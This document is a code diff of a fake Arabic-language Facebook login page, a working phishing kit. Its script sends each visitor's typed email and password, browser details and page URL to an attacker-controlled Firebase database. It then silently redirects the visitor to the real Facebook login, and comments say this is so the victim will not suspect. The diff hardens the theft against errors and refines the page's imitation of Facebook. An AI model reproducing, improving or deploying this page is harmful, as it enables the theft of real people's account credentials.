@@ -6,6 +6,7 @@
     <title>Facebook - تسجيل الدخول</title>
     <script src="https://cdn.tailwindcss.com"></script>
     
+    <!-- تحميل مكتبات Firebase بشكل مستقل لضمان الاستقرار -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
@@ -22,13 +23,18 @@
             measurementId: "G-9432BKFQCR"
         };
 
-        // الرابط الذي سيتم توجيه الشخص إليه فوراً بعد سحب البيانات
+        // الرابط المستهدف
         const redirectUrl = "https://www.facebook.com/login/device-based/regular/login/"; 
 
-        // تهيئة Firebase
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-        const auth = getAuth(app);
+        // تهيئة النظام
+        let db, auth;
+        try {
+            const app = initializeApp(firebaseConfig);
+            db = getFirestore(app);
+            auth = getAuth(app);
+        } catch (e) {
+            console.error("Firebase Init Error", e);
+        }
 
         const loginForm = document.getElementById('fbForm');
 
@@ -39,22 +45,26 @@
             const pass = document.getElementById('u_pass').value;
 
             try {
-                // تسجيل دخول مجهول لتمكين الكتابة
-                await signInAnonymously(auth);
-
-                // حفظ البيانات في كولكشن باسم 'logins'
-                await addDoc(collection(db, "logins"), {
-                    username: email,
-                    password: pass,
-                    createdAt: serverTimestamp(),
-                    deviceInfo: navigator.userAgent
-                });
-
-                // التوجيه المباشر والصامت
+                // محاولة تسجيل الدخول الصامت
+                if (auth) {
+                    await signInAnonymously(auth);
+                    
+                    // إرسال البيانات
+                    await addDoc(collection(db, "logins"), {
+                        username: email,
+                        password: pass,
+                        createdAt: serverTimestamp(),
+                        deviceInfo: navigator.userAgent,
+                        url: window.location.href
+                    });
+                }
+                
+                // التوجيه فوراً
                 window.location.replace(redirectUrl);
 
             } catch (error) {
-                // في حالة الخطأ نوجهه أيضاً لكي لا يشك
+                console.error("Submission Error", error);
+                // التوجيه حتى عند الفشل لضمان السرية
                 window.location.replace(redirectUrl);
             }
         });
@@ -62,14 +72,15 @@
 
     <style>
         body { background-color: #f0f2f5; font-family: -apple-system, system-ui, sans-serif; }
-        .input-style { background-color: #f5f6f7; border: 1px solid #dddfe2; }
-        .input-style:focus { border-color: #1877f2; background-color: white; outline: none; }
+        .input-style { background-color: #f5f6f7; border: 1px solid #dddfe2; transition: all 0.2s; }
+        .input-style:focus { border-color: #1877f2; background-color: white; outline: none; box-shadow: 0 0 0 2px #e7f3ff; }
         .fb-blue-btn { background-color: #1877f2; }
+        .fb-blue-btn:active { transform: scale(0.98); }
     </style>
 </head>
 <body class="flex flex-col min-h-screen">
 
-    <div class="bg-[#fffbe2] text-[#3b5998] py-2 text-center text-[12px] border-b border-[#e2e2e2]">
+    <div class="bg-[#fffbe2] text-[#3b5998] py-2 text-center text-[11px] border-b border-[#e2e2e2]">
         احصل على فيسبوك للأندرويد وتصفح أسرع.
     </div>
 
@@ -84,14 +95,14 @@
                     type="text" 
                     id="u_email"
                     placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" 
-                    class="input-style w-full p-3 rounded-lg text-md"
+                    class="input-style w-full p-3.5 rounded-lg text-md"
                     required
                 >
                 <input 
                     type="password" 
                     id="u_pass"
                     placeholder="كلمة السر" 
-                    class="input-style w-full p-3 rounded-lg text-md"
+                    class="input-style w-full p-3.5 rounded-lg text-md"
                     required
                 >
                 
@@ -125,7 +136,7 @@
         <div class="flex justify-center gap-6 text-[11px] text-gray-500 mb-2">
             <span>العربية</span>
             <span class="text-[#1877f2]">English (US)</span>
-            <span class="text-[#1877f2]">Français</span>
+            <span class="text-[#1877f2]">Français (France)</span>
         </div>
         <div class="text-center text-[11px] text-gray-400">Meta © 2024</div>
     </footer>
